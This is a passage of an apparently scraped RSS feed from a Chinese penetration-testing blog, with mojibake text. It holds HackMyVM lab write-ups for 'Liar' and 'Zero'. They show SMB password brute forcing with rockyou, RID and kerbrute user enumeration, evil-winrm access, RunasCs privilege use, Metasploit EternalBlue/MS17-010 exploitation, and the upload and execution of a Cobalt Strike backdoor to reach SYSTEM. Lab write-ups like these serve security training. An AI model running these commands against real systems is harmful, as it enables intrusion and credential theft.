Task Completed

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/liar]
â””â”€# gobuster dir -u http://192.168.56.16 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x jpg,php,html,png,zip,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.16
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpg,php,html,png,zip,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 1453501 / 1453508 (100.00%)
===============================================================
Finished
===============================================================
<br>æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿å•Š<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/liar]
â””â”€# smbmap -u guest -H 192.168.56.16

    \_\_\_\_\_\_\_\_  \_\_\_      \_\_\_  \_\_\_\_\_\_\_   \_\_\_      \_\_\_       \_\_         \_\_\_\_\_\_\_
   /"       )|"  \    /"  ||   \_  "\ |"  \    /"  |     /""\       |   \_\_ "\
  (:   \\_\_\_/  \   \  //   |(. |\_)  :) \   \  //   |    /    \      (. |\_\_) :)
   \\_\_\_  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  \_\_\_\_/
    \_\_/  \   |: \.        |(|  \_  \  |: \.        |  //  \_\_'  \    (|  /
   /" \   :) |.  \    /:  ||: |\_)  :)|.  \    /:  | /   /  \   \  /|\_\_/ \
  (\_\_\_\_\_\_\_/  |\_\_\_|\\_\_/|\_\_\_|(\_\_\_\_\_\_\_/ |\_\_\_|\\_\_/|\_\_\_|(\_\_\_/    \\_\_\_)(\_\_\_\_\_\_\_)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\*] Detected 1 hosts serving SMB
[\*] Established 0 SMB session(s)

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/liar]
â””â”€# smbmap -u anonymous -H 192.168.56.16

    \_\_\_\_\_\_\_\_  \_\_\_      \_\_\_  \_\_\_\_\_\_\_   \_\_\_      \_\_\_       \_\_         \_\_\_\_\_\_\_
   /"       )|"  \    /"  ||   \_  "\ |"  \    /"  |     /""\       |   \_\_ "\
  (:   \\_\_\_/  \   \  //   |(. |\_)  :) \   \  //   |    /    \      (. |\_\_) :)
   \\_\_\_  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  \_\_\_\_/
    \_\_/  \   |: \.        |(|  \_  \  |: \.        |  //  \_\_'  \    (|  /
   /" \   :) |.  \    /:  ||: |\_)  :)|.  \    /:  | /   /  \   \  /|\_\_/ \
  (\_\_\_\_\_\_\_/  |\_\_\_|\\_\_/|\_\_\_|(\_\_\_\_\_\_\_/ |\_\_\_|\\_\_/|\_\_\_|(\_\_\_/    \\_\_\_)(\_\_\_\_\_\_\_)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\*] Detected 1 hosts serving SMB
[\*] Established 0 SMB session(s)
<br>ä¸å­˜åœ¨åŒ¿åç™»å½•ä¸æ¥å®¾ç™»å½•<br>å°è¯•å¯¹ç”¨æˆ·nicaè¿›è¡Œçˆ†ç ´çœ‹çœ‹<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/liar]
â””â”€# crackmapexec smb 192.168.56.16 -u nica -p /usr/share/wordlists/rockyou.txt |grep +
SMB         192.168.56.16   445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\nica:hardcore
<br>æˆåŠŸè·å–åˆ°ç”¨æˆ·çš„å¯†ç hardcore<br>SMBå…±äº«çœ‹ä¸€ä¸‹<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/liar]
â””â”€# smbmap -u nica -p hardcore  -H 192.168.56.16

    \_\_\_\_\_\_\_\_  \_\_\_      \_\_\_  \_\_\_\_\_\_\_   \_\_\_      \_\_\_       \_\_         \_\_\_\_\_\_\_
   /"       )|"  \    /"  ||   \_  "\ |"  \    /"  |     /""\       |   \_\_ "\
  (:   \\_\_\_/  \   \  //   |(. |\_)  :) \   \  //   |    /    \      (. |\_\_) :)
   \\_\_\_  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  \_\_\_\_/
    \_\_/  \   |: \.        |(|  \_  \  |: \.        |  //  \_\_'  \    (|  /
   /" \   :) |.  \    /:  ||: |\_)  :)|.  \    /:  | /   /  \   \  /|\_\_/ \
  (\_\_\_\_\_\_\_/  |\_\_\_|\\_\_/|\_\_\_|(\_\_\_\_\_\_\_/ |\_\_\_|\\_\_/|\_\_\_|(\_\_\_/    \\_\_\_)(\_\_\_\_\_\_\_)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\*] Detected 1 hosts serving SMB
[\*] Established 1 SMB session(s)

[+] IP: 192.168.56.16:445       Name: 192.168.56.16             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Admin remota
        C$                                                      NO ACCESS       Recurso predeterminado
        IPC$                                                    READ ONLY       IPC remota
<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/liar]
â””â”€# smbclient -U 'nica' //192.168.56.16/IPC$
Password for [WORKGROUP\nica]:
Try "help" to get a list of possible commands.
smb: \&gt; ls
NT\_STATUS\_NO\_SUCH\_FILE listing \\*
smb: \&gt;
<br>å¥½å§ï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/liar]
â””â”€# crackmapexec smb 192.168.56.16 -u nica -p hardcore --rid-brute &gt;rid\_brute\_user.txt

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/liar]
â””â”€# wc -l rid\_brute\_user.txt
11 rid\_brute\_user.txt

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/liar]
â””â”€# cat rid\_brute\_user.txt
SMB         192.168.56.16   445    WIN-IURF14RBVGV  [\*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-IURF14RBVGV) (domain:WIN-IURF14RBVGV) (signing:False) (SMBv1:False)
SMB         192.168.56.16   445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\nica:hardcore
SMB         192.168.56.16   445    WIN-IURF14RBVGV  [+] Brute forcing RIDs
SMB         192.168.56.16   445    WIN-IURF14RBVGV  500: WIN-IURF14RBVGV\Administrador (SidTypeUser)
SMB         192.168.56.16   445    WIN-IURF14RBVGV  501: WIN-IURF14RBVGV\Invitado (SidTypeUser)
SMB         192.168.56.16   445    WIN-IURF14RBVGV  503: WIN-IURF14RBVGV\DefaultAccount (SidTypeUser)
SMB         192.168.56.16   445    WIN-IURF14RBVGV  504: WIN-IURF14RBVGV\WDAGUtilityAccount (SidTypeUser)
SMB         192.168.56.16   445    WIN-IURF14RBVGV  513: WIN-IURF14RBVGV\Ninguno (SidTypeGroup)
SMB         192.168.56.16   445    WIN-IURF14RBVGV  1000: WIN-IURF14RBVGV\nica (SidTypeUser)
SMB         192.168.56.16   445    WIN-IURF14RBVGV  1001: WIN-IURF14RBVGV\akanksha (SidTypeUser)
SMB         192.168.56.16   445    WIN-IURF14RBVGV  1002: WIN-IURF14RBVGV\Idministritirs (SidTypeAlias)
<br>å¯ä»¥å‘ç°è¿˜æœ‰ä¸€ä¸ªç”¨æˆ·æ˜¯akanksha<br>å†çˆ†ç ´ä¸€æ³¢è¿™ä¸ªç”¨æˆ·çš„å¯†ç <br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/liar]
â””â”€# crackmapexec smb 192.168.56.16 -u akanksha -p /usr/share/wordlists/rockyou.txt |grep +
SMB         192.168.56.16   445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\akanksha:sweetgirl
<br>ok,è·å–åˆ°äº†å¯†ç  sweetgirl<br>çœ‹çœ‹smbå…±äº«<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/liar]
â””â”€# smbmap -u akanksha -p sweetgirl -H 192.168.56.16

    \_\_\_\_\_\_\_\_  \_\_\_      \_\_\_  \_\_\_\_\_\_\_   \_\_\_      \_\_\_       \_\_         \_\_\_\_\_\_\_
   /"       )|"  \    /"  ||   \_  "\ |"  \    /"  |     /""\       |   \_\_ "\
  (:   \\_\_\_/  \   \  //   |(. |\_)  :) \   \  //   |    /    \      (. |\_\_) :)
   \\_\_\_  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  \_\_\_\_/
    \_\_/  \   |: \.        |(|  \_  \  |: \.        |  //  \_\_'  \    (|  /
   /" \   :) |.  \    /:  ||: |\_)  :)|.  \    /:  | /   /  \   \  /|\_\_/ \
  (\_\_\_\_\_\_\_/  |\_\_\_|\\_\_/|\_\_\_|(\_\_\_\_\_\_\_/ |\_\_\_|\\_\_/|\_\_\_|(\_\_\_/    \\_\_\_)(\_\_\_\_\_\_\_)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\*] Detected 1 hosts serving SMB
[\*] Established 1 SMB session(s)

[+] IP: 192.168.56.16:445       Name: 192.168.56.16             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Admin remota
        C$                                                      NO ACCESS       Recurso predeterminado
        IPC$                                                    READ ONLY       IPC remota
<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/liar]
â””â”€# smbclient -U akanksha //192.168.56.16/IPC$
Password for [WORKGROUP\akanksha]:
Try "help" to get a list of possible commands.
smb: \&gt; ls
NT\_STATUS\_NO\_SUCH\_FILE listing \\*
<br>è¿˜æ˜¯ä»€ä¹ˆéƒ½æ²¡æœ‰ã€‚æˆ‘æµ‹<br>è™½ç„¶SMBæä¸äº†ã€‚<br>çœ‹çœ‹èƒ½ä¸èƒ½winrmè¿ä¸Šå»<br>æ£€æµ‹ä¸€ä¸‹WinRMæœåŠ¡<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/liar]
â””â”€# nmap -p 5985,5986 -sT 192.168.56.16
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 13:39 CST
Nmap scan report for 192.168.56.16
Host is up (0.00025s latency).

PORT     STATE  SERVICE
5985/tcp open   wsman
5986/tcp closed wsmans
MAC Address: 08:00:27:2F:A2:49 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
<br>å¯ä»¥å‘ç°httpçš„éåŠ å¯†ç«¯å£æ˜¯å¼€æ”¾çš„ã€‚httpsçš„ç«¯å£å…³é—­<br>ç›´æ¥ç”¨evil-winrmè¯•è¯•è¿æ¥<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/liar]
â””â”€# evil-winrm -i 192.168.56.16 -u nica -p hardcore

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting\_detection\_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
\*Evil-WinRM\* PS C:\Users\nica\Documents&gt;
<br>nicaç”¨æˆ·å¯ä»¥ç™»å½•ï¼Œakankshaç™»å½•ä¸äº†<br>åœ¨nicaç”¨æˆ·ç›®å½•ä¸‹è·å–flag<br>\*Evil-WinRM\* PS C:\users\nica&gt; type user.txt
HMVWINGIFT
<br>ç›´æ¥ä¸ŠCS<br>\*Evil-WinRM\* PS C:\users\nica&gt; upload /home/kali/hmv/liar/4444.exe

Info: Uploading /home/kali/hmv/liar/4444.exe to C:\users\nica\4444.exe

Data: 394580 bytes of 394580 bytes copied

Info: Upload successful!
<br>çº³å°¼ã€‚è¿è¡Œä¸äº†ã€‚æˆ‘æµ‹<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/24.liar.002.png" referrerpolicy="no-referrer"><br><br>çœ‹äº†ä¸€ä¸‹wp åŸæ¥å¯ä»¥ç”¨<a data-tooltip-position="top" aria-label="../../26-å·¥å…·ä½¿ç”¨/RunasCSä½¿ç”¨" data-href="../../26-å·¥å…·ä½¿ç”¨/RunasCSä½¿ç”¨" href="https://www.c1trus.top/26-å·¥å…·ä½¿ç”¨/runascsä½¿ç”¨.html" class="internal-link" target="_self" rel="noopener nofollow">RunasCS</a>.exe<br>è¿™ä¸ªå·¥å…·å…è®¸æˆ‘ä»¬å½“å‰ç”¨æˆ·ç”¨å¦å¤–ä¸€ä¸ªç”¨æˆ·çš„æƒé™æ‰§è¡Œå‘½ä»¤ï¼Œå‰ææ˜¯éœ€è¦å¦ä¸€ä¸ªç”¨æˆ·çš„è´¦å·å¯†ç <br>è¿™é‡Œæˆ‘ä»¬åˆšå¥½æ»¡è¶³ï¼Œå› ä¸ºakankshaç”¨æˆ·æ— æ³•winrmç™»å½•ã€‚ä½†æ˜¯æˆ‘ä»¬çŸ¥é“ä»–çš„å¯†ç é‚£æˆ‘ä»¬å°±å¯ä»¥ä»¥ä»–çš„æƒé™æ‰§è¡Œå‘½ä»¤<br>\*Evil-WinRM\* PS C:\users\nica&gt; .\runascs.exe akanksha sweetgirl "cmd /c whoami /all"


INFORMACIÃ N DE USUARIO
----------------------

Nombre de usuario        SID
======================== ==============================================
win-iurf14rbvgv\akanksha S-1-5-21-2519875556-2276787807-2868128514-1001


INFORMACIÃ N DE GRUPO
--------------------

Nombre de grupo                              Tipo           SID                                            Atributos
============================================ ============== ============================================== ========================================================================
Todos                                        Grupo conocido S-1-1-0                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
WIN-IURF14RBVGV\Idministritirs               Alias          S-1-5-21-2519875556-2276787807-2868128514-1002 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Usuarios                             Alias          S-1-5-32-545                                   Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\INTERACTIVE                     Grupo conocido S-1-5-4                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
INICIO DE SESIÃ N EN LA CONSOLA               Grupo conocido S-1-2-1                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Usuarios autentificados         Grupo conocido S-1-5-11                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Esta compaÂ¤Â¡a                   Grupo conocido S-1-5-15                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Cuenta local                    Grupo conocido S-1-5-113                                      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\AutenticaciÂ¢n NTLM              Grupo conocido S-1-5-64-10                                    Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
Etiqueta obligatoria\Nivel obligatorio medio Etiqueta       S-1-16-8192


INFORMACIÃ N DE PRIVILEGIOS
--------------------------

Nombre de privilegio          DescripciÂ¢n                                  Estado
============================= ============================================ =============
SeChangeNotifyPrivilege       Omitir comprobaciÂ¢n de recorrido             Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitado
<br>WIN-IURF14RBVGV\Idministritirs               Alias          S-1-5-21-2519875556-2276787807-2868128514-1002 Grupo 
<br>å¯ä»¥å‘ç°è¿™ä¸ªç”¨æˆ·æ˜¯å±äºç®¡ç†å‘˜ç»„çš„<br>ç›´æ¥è¯»å–flag<br>\*Evil-WinRM\* PS C:\users\nica&gt; .\runascs.exe akanksha sweetgirl "cmd /c type c:\users\Administrador\root.txt"

HMV1STWINDOWZ
]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/24.liar.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/24.liar.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/24.liar.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/24.liar.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[23.Zero]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. è·å–ä¸€ä¸ªADç”¨æˆ·" data-href="#3. è·å–ä¸€ä¸ªADç”¨æˆ·" href="https://www.c1trus.top/about:blank#3._è·å–ä¸€ä¸ªADç”¨æˆ·" class="internal-link" target="_self" rel="noopener nofollow">3. è·å–ä¸€ä¸ªADç”¨æˆ·</a>

<br><a data-tooltip-position="top" aria-label="3.1. SMBç©ºä¼šè¯æ£€æµ‹" data-href="#3.1. SMBç©ºä¼šè¯æ£€æµ‹" href="https://www.c1trus.top/about:blank#3.1._SMBç©ºä¼šè¯æ£€æµ‹" class="internal-link" target="_self" rel="noopener nofollow">3.1. SMBç©ºä¼šè¯æ£€æµ‹</a>
<br><a data-tooltip-position="top" aria-label="3.2. kerbruteçˆ†ç ´ç”¨æˆ·" data-href="#3.2. kerbruteçˆ†ç ´ç”¨æˆ·" href="https://www.c1trus.top/about:blank#3.2._kerbruteçˆ†ç ´ç”¨æˆ·" class="internal-link" target="_self" rel="noopener nofollow">3.2. kerbruteçˆ†ç ´ç”¨æˆ·</a>


<br><a data-tooltip-position="top" aria-label="4. å†æ‰“MS17-010" data-href="#4. å†æ‰“MS17-010" href="https://www.c1trus.top/about:blank#4._å†æ‰“MS17-010" class="internal-link" target="_self" rel="noopener nofollow">4. å†æ‰“MS17-010</a>
<br>é¶æœºé“¾æ¥ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=Zero
<br>ä½œè€…ï¼š[ruycr4ft](https://hackmyvm.eu/profile/?user=ruycr4ft)
<br>éš¾åº¦ï¼šâ­ï¸
<br>çŸ¥è¯†ç‚¹ï¼šMS17-010
<br><br> fscan -h 192.168.56.15

   \_\_\_                              \_
  / \_ \     \_\_\_  \_\_\_ \_ \_\_ \_\_ \_  \_\_\_| | \_\_
 / /\_\/\_\_\_\_/ \_\_|/ \_\_| '\_\_/ \_ |/ \_\_| |/ /
/ /\_\\\_\_\_\_\_\\_\_ \ (\_\_| | | (\_| | (\_\_|   &lt;
\\_\_\_\_/     |\_\_\_/\\_\_\_|\_|  \\_\_,\_|\\_\_\_|\_|\\_\
                     fscan version: 1.8.4
start infoscan
192.168.56.15:445 open
192.168.56.15:139 open
192.168.56.15:135 open
192.168.56.15:88 open
[\*] alive ports len is: 4
start vulscan
[+] MS17-010 192.168.56.15      (Windows Server 2016 Standard Evaluation 14393)
[\*] NetBios 192.168.56.15   [+] DC:DC01.zero.hmv                 Windows Server 2016 Standard Evaluation 14393
[\*] NetInfo
[\*]192.168.56.15
   [-&gt;]DC01
   [-&gt;]192.168.56.15
å·²å®Œæˆ 4/4
[\*] æ‰«æç»“æŸ,è€—æ—¶: 3.061390899s

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Zero]
â””â”€# nmap -sC -sV 192.168.56.15 -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 07:06 CST
Nmap scan report for 192.168.56.15
Host is up (0.00015s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-20 22:37:00Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: zero.hmv, Site: Defaute-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup:
464/tcp  open  kpasswd5?
593/tcp  open  ncacn\_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: zero.hmv, Site: Defaute-Name)
3269/tcp open  tcpwrapped
MAC Address: 08:00:27:CB:14:11 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|\_nbstat: NetBIOS name: DC01, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:cb:14:11 (Oracle Virtual NIC)
| smb-os-discovery:
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3
|   Computer name: DC01
|   NetBIOS computer name: DC01\x00
|   Domain name: zero.hmv
|   Forest name: zero.hmv
|   FQDN: DC01.zero.hmv
|\_  System time: 2024-11-20T14:37:01-08:00
|\_clock-skew: mean: 2h09m55s, deviation: 4h37m07s, median: -30m04s
| smb-security-mode:
|   account\_used: guest
|   authentication\_level: user
|   challenge\_response: supported
|\_  message\_signing: required
| smb2-time:
|   date: 2024-11-20T22:37:01
|\_  start\_date: 2024-11-20T22:35:17
| smb2-security-mode:
|   3:1:1:
|\_    Message signing enabled and required
<br>é…ç½®/etc/hosts<br>192.168.56.15 DC01.zero.hmv  zero.hmv
<br>å‘ç°æœ‰æ°¸æ’ä¹‹è“ã€‚<br>ç›´æ¥ä¸Šmsfæ‰“ä¸€æ³¢çœ‹çœ‹<br>use exploit/windows/smb/ms17\_010\_eternalblue
set payload windows/x64/meterpreter/bind\_tcp\_uuid
set rhosts 172.22.11.45
run
<br>ç›´æ¥ç»™é¶æœºå¹²è“å±äº†ã€‚é‡æ–°åˆ©ç”¨å¥½åƒä¸è¡Œäº†ã€‚<br>è¿˜æ˜¯æ­£å¸¸æ‰“å§ã€‚<br><br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Zero]
â””â”€# smbmap -u guest -H zero.hmv

    \_\_\_\_\_\_\_\_  \_\_\_      \_\_\_  \_\_\_\_\_\_\_   \_\_\_      \_\_\_       \_\_         \_\_\_\_\_\_\_
   /"       )|"  \    /"  ||   \_  "\ |"  \    /"  |     /""\       |   \_\_ "\
  (:   \\_\_\_/  \   \  //   |(. |\_)  :) \   \  //   |    /    \      (. |\_\_) :)
   \\_\_\_  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  \_\_\_\_/
    \_\_/  \   |: \.        |(|  \_  \  |: \.        |  //  \_\_'  \    (|  /
   /" \   :) |.  \    /:  ||: |\_)  :)|.  \    /:  | /   /  \   \  /|\_\_/ \
  (\_\_\_\_\_\_\_/  |\_\_\_|\\_\_/|\_\_\_|(\_\_\_\_\_\_\_/ |\_\_\_|\\_\_/|\_\_\_|(\_\_\_/    \\_\_\_)(\_\_\_\_\_\_\_)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\*] Detected 1 hosts serving SMB
[\*] Established 0 SMB session(s)
<br>æ²¡æœ‰<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Zero]
â””â”€# kerbrute userenum -d zero.hmv -t 100 --dc DC01.zero.hmv /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -o valid\_user.txt

    \_\_             \_\_               \_\_
   / /\_\_\_\_\_  \_\_\_\_\_/ /\_  \_\_\_\_\_\_\_  \_\_/ /\_\_\_\_
  / //\_/ \_ \/ \_\_\_/ \_\_ \/ \_\_\_/ / / / \_\_/ \_ \
 / ,&lt; /  \_\_/ /  / /\_/ / /  / /\_/ / /\_/  \_\_/
/\_/|\_|\\_\_\_/\_/  /\_.\_\_\_/\_/   \\_\_,\_/\\_\_/\\_\_\_/

Version: v1.0.3 (9dad6e1) - 11/21/24 - Ronnie Flathers @ropnop

2024/11/21 07:23:00 &gt;  Using KDC(s):
2024/11/21 07:23:00 &gt;   DC01.zero.hmv:88

2024/11/21 07:23:00 &gt;  [+] VALID USERNAME:       administrator@zero.hmv
2024/11/21 07:23:00 &gt;  [+] VALID USERNAME:       Administrator@zero.hmv
2024/11/21 07:26:17 &gt;  [+] VALID USERNAME:       dc01@zero.hmv
2024/11/21 07:27:35 &gt;  Done! Tested 8295455 usernames (3 valid) in 275.149 seconds
<br>ä¹Ÿæ²¡æœ‰ä»€ä¹ˆä¸œè¥¿<br><br>msfé‡Œé¢å¯ä¸æ­¢ä¸€ç§MS17-010çš„åˆ©ç”¨<br>msf6 &gt; search ms17

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank     Check  Description
   -   ----                                                  ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17\_010\_eternalblue              2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \\_ target: Automatic Target                         .                .        .      .
   2     \\_ target: Windows 7                                .                .        .      .
   3     \\_ target: Windows Embedded Standard 7              .                .        .      .
   4     \\_ target: Windows Server 2008 R2                   .                .        .      .
   5     \\_ target: Windows 8                                .                .        .      .
   6     \\_ target: Windows 8.1                              .                .        .      .
   7     \\_ target: Windows Server 2012                      .                .        .      .
   8     \\_ target: Windows 10 Pro                           .                .        .      .
   9     \\_ target: Windows 10 Enterprise Evaluation         .                .        .      .
   10  exploit/windows/smb/ms17\_010\_psexec                   2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \\_ target: Automatic                                .                .        .      .
   12    \\_ target: PowerShell                               .                .        .      .
   13    \\_ target: Native upload                            .                .        .      .
   14    \\_ target: MOF upload                               .                .        .      .
   15    \\_ AKA: ETERNALSYNERGY                              .                .        .      .
   16    \\_ AKA: ETERNALROMANCE                              .                .        .      .
   17    \\_ AKA: ETERNALCHAMPION                             .                .        .      .
   18    \\_ AKA: ETERNALBLUE                                 .                .        .      .
   19  auxiliary/admin/smb/ms17\_010\_command                  2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \\_ AKA: ETERNALSYNERGY                              .                .        .      .
   21    \\_ AKA: ETERNALROMANCE                              .                .        .      .
   22    \\_ AKA: ETERNALCHAMPION                             .                .        .      .
   23    \\_ AKA: ETERNALBLUE                                 .                .        .      .
   24  auxiliary/scanner/smb/smb\_ms17\_010                    .                normal   No     MS17-010 SMB RCE Detection
   25    \\_ AKA: DOUBLEPULSAR                                .                .        .      .
   26    \\_ AKA: ETERNALBLUE                                 .                .        .      .
   27  exploit/windows/fileformat/office\_ms17\_11882          2017-11-15       manual   No     Microsoft Office CVE-2017-11882
   28  auxiliary/admin/mssql/mssql\_escalate\_execute\_as       .                normal   No     Microsoft SQL Server Escalate EXECUTE AS
   29  auxiliary/admin/mssql/mssql\_escalate\_execute\_as\_sqli  .                normal   No     Microsoft SQL Server SQLi Escalate Execute AS
   30  exploit/windows/smb/smb\_doublepulsar\_rce              2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   31    \\_ target: Execute payload (x64)                    .                .        .      .
   32    \\_ target: Neutralize implant                
<br>è¯•è¯•exploit/windows/smb/ms17_010_psexec <br>use exploit/windows/smb/ms17\_010\_psexec 
set rhost
run
<br>ä¸Šä¼ csåé—¨å¹¶è¿è¡Œ<br>upload 4444.exe C:\\4444.exe
excute -f C:\\4444.exe
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/23.Zero.001.png" referrerpolicy="no-referrer"><br>systemæƒé™ å·²ç»æ‹¿ä¸‹äº†<br>HMV{Z3r0\_l0g0n\_!s\_Pr3tty\_D4ng3r0u$}
HMV{D0nt\_r3us3\_p4$$w0rd5!}
]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/23.zero.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/23.Zero.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/23.Zero.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/23.Zero.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[22.DC03]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
